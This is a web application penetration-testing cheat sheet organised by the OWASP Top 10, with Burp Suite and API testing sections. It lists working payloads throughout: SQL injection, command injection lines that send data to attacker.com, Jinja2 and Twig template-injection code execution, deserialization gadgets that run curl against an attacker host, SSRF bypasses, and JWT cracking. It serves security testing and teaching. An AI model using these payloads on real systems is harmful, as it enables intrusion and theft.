# Web Application Security Reference

## OWASP Top 10 (2021) — Attack & Defense

### A01 — Broken Access Control
**Attack vectors:**
- IDOR: Change `id=123` to `id=124`, observe if different user's data returns
- Forced browsing: Access `/admin`, `/api/v1/users` without authorization
- JWT manipulation: Decode, modify `"role":"admin"`, re-encode (if weak signing)
- HTTP method bypass: Try PUT/DELETE on endpoints that only check GET

**Burp techniques:**
```
1. Authorize extension — map all endpoints as low-priv user
2. Replay high-priv requests with low-priv cookies
3. CORS misconfiguration: check Access-Control-Allow-Origin: *
```

**Fix:** Implement server-side access control on every endpoint. Deny by default.

---

### A02 — Cryptographic Failures
**Common findings:**
- HTTP used instead of HTTPS
- Weak algorithms: MD5, SHA1, DES, RC4, ECB mode
- Hardcoded keys/secrets in source code
- Sensitive data in URL parameters (logged by proxies/servers)
- JWT with `alg: none` or weak HS256 secret

**Test:**
```bash
# Check TLS configuration
testssl.sh https://target.com
sslyze target.com

# Find secrets in JS files
grep -r "api_key\|password\|secret\|token" ./js/ 
truffleHog --regex https://github.com/org/repo
```

---

### A03 — Injection

#### SQL Injection
```sql
-- Detection
' OR '1'='1
'; SELECT SLEEP(5)-- -
1 AND 1=2 UNION SELECT NULL--

-- SQLMap automation
sqlmap -u "https://target.com/item?id=1" --dbs --batch
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --level=5

-- Blind Boolean-based
1 AND SUBSTRING(username,1,1)='a'-- -

-- Time-based blind
1; IF(1=1) WAITFOR DELAY '0:0:5'--
```

#### Command Injection
```bash
# Payload list
; id
| id  
`id`
$(id)
; ping -c 1 attacker.com
; curl http://attacker.com/$(whoami)

# Blind detection via DNS/HTTP callback
; nslookup $(whoami).attacker.burpcollaborator.net
```

#### SSTI (Server-Side Template Injection)
```
# Detection
{{7*7}} → 49?
${7*7}
<%= 7*7 %>

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig RCE  
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

### A04 — Insecure Design
Focus areas:
- Business logic flaws (price manipulation, workflow bypass)
- Race conditions (double-spend, TOCTOU)
- Mass assignment (POST extra fields, hope server binds them)

```python
# Race condition test (Python)
import threading, requests

def buy():
    requests.post('/buy', data={'item': 'expensive', 'qty': 1})
    
threads = [threading.Thread(target=buy) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

### A05 — Security Misconfiguration
**Checklist:**
```bash
# Default creds
admin:admin, admin:password, root:root

# Debug endpoints
/actuator (Spring Boot — check /actuator/env, /actuator/heapdump)
/console (H2 database console)
/.git/ (source code exposure)
/phpinfo.php
/server-status (Apache)

# HTTP security headers check
curl -I https://target.com | grep -i "x-frame\|content-security\|strict-transport\|x-content-type"

# S3 bucket misconfiguration
aws s3 ls s3://bucket-name --no-sign-request
```

---

### A07 — Identification & Authentication Failures
```
Testing checklist:
□ Username enumeration (different responses for valid/invalid users)
□ Password brute force (no lockout, no CAPTCHA)
□ Weak password policy
□ Default credentials
□ Predictable session tokens (check entropy)
□ Session fixation
□ JWT: alg:none, weak secret, missing exp

# JWT crack
hashcat -a 0 -m 16500 <JWT_TOKEN> wordlist.txt

# Session token entropy
Burp Sequencer → Capture session tokens → Analyze
```

---

### A08 — Software & Data Integrity Failures
- **Insecure deserialization:**
```bash
# Java deserialization
ysoserial CommonsCollections6 'curl http://attacker.com' | base64

# PHP object injection
O:8:"UserData":1:{s:8:"username";s:5:"admin";}

# Python pickle
import pickle, os
class Exploit: __reduce__ = lambda self: (os.system, ('curl http://attacker.com',))
pickle.dumps(Exploit())
```

---

### A10 — SSRF (Server-Side Request Forgery)
```bash
# Basic SSRF
url=http://169.254.169.254/latest/meta-data/  # AWS metadata
url=http://localhost:6379/  # Redis
url=http://internal-service.corp/

# Bypass filters
http://2130706433/  # 127.0.0.1 in decimal
http://0x7f000001/  # 127.0.0.1 in hex
http://127.1/
http://[::1]/
http://attacker.com@127.0.0.1/

# DNS rebinding / Collaborator
use Burp Collaborator for blind SSRF detection
```

---

## Burp Suite Pro Workflow

### Setup
```
1. Proxy → Intercept ON
2. Target → Scope: add target domain
3. Proxy → HTTP History → Filter: In scope only
4. Scanner: Active scan on all in-scope items
5. Extensions: Authorize, ActiveScan++, J2EEScan, Param Miner, Logger++
```

### Useful Tricks
```
# Param discovery
Param Miner → Guess params → find hidden parameters

# Out-of-band detection
Collaborator → copy payload → inject in headers (X-Forwarded-For, Referer, etc.)

# Finding hidden endpoints
Target → Site map → right-click → Engagement tools → Find comments
Content discovery → built-in wordlists
```

---

## API Security Testing

```bash
# Get API spec
/swagger.json, /openapi.json, /api-docs, /v1/docs

# Import to Postman, then test each endpoint for:
# - Missing auth
# - BOLA/IDOR  
# - Mass assignment
# - Excessive data exposure
# - Rate limiting

# GraphQL
{__schema{types{name}}}  # introspection
# Tool: GraphQL Voyager to visualize schema

# REST API fuzzing with ffuf
ffuf -w api_wordlist.txt -u https://api.target.com/v1/FUZZ \
     -H "Authorization: Bearer <token>" -mc 200,201,204
```
